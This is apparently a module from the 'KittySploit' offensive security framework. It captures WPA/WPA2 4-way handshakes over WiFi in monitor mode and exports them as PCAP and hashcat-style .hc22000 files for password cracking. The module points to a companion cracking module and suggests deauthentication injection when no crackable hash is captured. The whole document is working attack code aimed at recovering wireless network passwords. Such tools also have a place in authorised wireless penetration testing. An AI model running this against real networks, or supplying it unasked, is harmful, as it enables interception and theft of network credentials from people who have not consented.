#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Live WPA handshake capture with automatic .hc22000 export (pure Python)."""

from __future__ import annotations
import os
import time
from kittysploit import *
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi Handshake Capture + HC22000 Export",
        "description": (
            "Sniff EAPOL on monitor mode, aggregate 4-way exchanges, write PCAP and "
            ".hc22000 for auxiliary/wlan/wpa_cpu_crack (no aircrack/hashcat)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "handshake", "hc22000", "eapol"],
        "references": ["https://attack.mitre.org/techniques/T1040/"],
    }

    timeout = OptInteger(120, "Capture duration in seconds", required=False)
    bssid = OptString("", "Filter by AP BSSID", required=False)
    output = OptString("", "Handshake PCAP output (auto if empty)", required=False)
    hc22000 = OptString("", "HC22000 output path (auto if empty)", required=False)

    def check(self):
        return self.wlan_check_iface()

    def run(self):
        timeout = max(10, int(self.timeout or 120))
        bssid_filter = str(self.bssid or "").strip().lower()
        self.wlan_reset_scan_state()
        self.wlan_reset_handshake_tracker()
        ssid_by_bssid: dict[str, str] = {}
        frames: list[bytes] = []

        print_info(f"Handshake capture on {self.iface} ({timeout}s)")
        print_status("Waiting for EAPOL key material...")

        def on_frame(raw: bytes, _rssi: int | None) -> None:
            beacon = self.wlan_parse_beacon(raw)
            if beacon and beacon.ssid:
                self.wlan_note_beacon_ssid(beacon, ssid_by_bssid)
                self.wlan_register_beacon(beacon)
            eap = self.wlan_parse_eapol(raw)
            if not eap:
                return
            if bssid_filter and eap.bssid.lower() != bssid_filter:
                return
            frames.append(raw)
            self.wlan_track_parsed_eapol(eap, ssid_by_bssid)
            km = eap.key_message or 0
            print_status(f"EAPOL M{km} {eap.bssid} <-> {eap.station}")

        try:
            self.wlan_sniff(on_frame, timeout=float(timeout))
        except (PermissionError, OSError) as exc:
            print_error(f"Capture failed: {exc}")
            return False

        for row in self.wlan_handshake_summaries():
            if row.get("exportable"):
                print_info(
                    f"  {row['bssid']} ↔ {row['station']} | {row['messages']} | "
                    f"pair {row.get('message_pair')} ({row.get('export_label')})"
                )

        lines = self.wlan_export_hc22000(ssid_by_bssid)
        if not lines and not frames:
            print_warning("No EAPOL material captured")
            return False

        stamp = time.strftime("%Y%m%d_%H%M%S")
        pcap_path = str(self.output or "").strip() or os.path.abspath(f"wlan_handshake_{stamp}.pcap")
        hc_path = str(self.hc22000 or "").strip() or os.path.abspath(f"wlan_handshake_{stamp}.hc22000")

        if frames:
            self.wlan_write_pcap(pcap_path, frames)
            print_success(f"PCAP: {pcap_path} ({len(frames)} frame(s))")
        if lines:
            self.wlan_write_hc22000(hc_path, lines)
            print_success(f"HC22000: {hc_path} ({len(lines)} line(s))")
            if bssid_filter and bssid_filter in ssid_by_bssid:
                self.wlan_vault_store(
                    ssid=ssid_by_bssid[bssid_filter],
                    bssid=bssid_filter,
                    secret_type="hash_ref",
                    hash_file=hc_path,
                    pcap_file=pcap_path if frames else "",
                )
            print_info("Crack: auxiliary/wlan/wpa_cpu_crack or auxiliary/wlan/wlan_pipeline")
            return True
        print_warning("EAPOL seen but no crackable hash lines yet — retry with deauth_inject")
        return False